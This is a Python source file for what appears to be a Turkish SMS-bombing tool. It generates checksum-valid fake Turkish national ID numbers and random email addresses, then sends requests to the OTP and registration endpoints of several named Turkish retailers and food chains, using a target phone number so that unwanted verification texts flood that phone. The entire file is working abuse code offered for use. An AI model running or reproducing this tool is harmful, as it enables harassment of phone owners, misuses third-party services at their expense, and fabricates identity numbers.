import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style

class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        # TC No Algoritması (Gerçekçi üretim)
        rakam = [randint(1,9)]
        for _ in range(8): rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append(sum(rakam) % 10)
        self.tc = "".join(map(str, rakam))
        
        self.phone = str(phone)
        self.mail = mail if mail else f"{''.join(choice(ascii_lowercase) for _ in range(12))}@gmail.com"
        self.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

    def log(self, service, success):
        if success:
            self.adet += 1
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> {service}")
        else:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> {service}")

    def KahveDunyasi(self):    
        try:
            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", 
                             json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
            self.log("kahvedunyasi.com", r.json().get("processStatus") == "Success")
        except: self.log("kahvedunyasi.com", False)

    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
            self.log("bim.veesk.net", r.status_code == 200)
        except: self.log("bim.veesk.net", False)

    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", 
                             json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}, timeout=6)
            self.log("dominos.com.tr", r.json().get("isSuccess") == True)
        except: self.log("dominos.com.tr", False)

    # ... (Diğer servisler aynı mantıkla optimize edildi, Kali uyumlu timeoutlar eklendi)
    def Pidem(self):
        try:
            json_data = {"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post("https://restashop.azurewebsites.net/graphql/", json=json_data, timeout=6)
            self.log("pidem.com.tr", "SUCCESS" in r.text)
        except: self.log("pidem.com.tr", False)
